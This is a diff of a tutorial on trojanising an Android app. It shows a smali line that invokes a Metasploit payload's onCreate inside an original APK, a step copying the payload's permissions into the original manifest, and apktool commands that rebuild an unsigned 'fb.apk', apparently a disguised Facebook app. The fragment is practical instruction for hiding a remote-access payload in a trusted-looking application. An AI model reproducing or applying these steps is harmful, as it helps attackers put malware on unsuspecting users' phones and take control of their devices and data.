@@ -105,3 +105,10 @@ Here we need to find the onCreate function in which we will find an Landroid fun
 invoke-static {p0}, Lcom/metasploit/stage/Payload;->onCreate(Landroid/content/Context;)V 
 
 Now add some of the permissions from payload apk manifest file to original apk manifest file and save all the files
+Recompile the apk
+> cd /root/Desktop/
+> apktool b original
+We can find recompiled application in
+> cd original
+> cd dist
+> ls (you will find recompiled application here, fb.apk which is not signed)
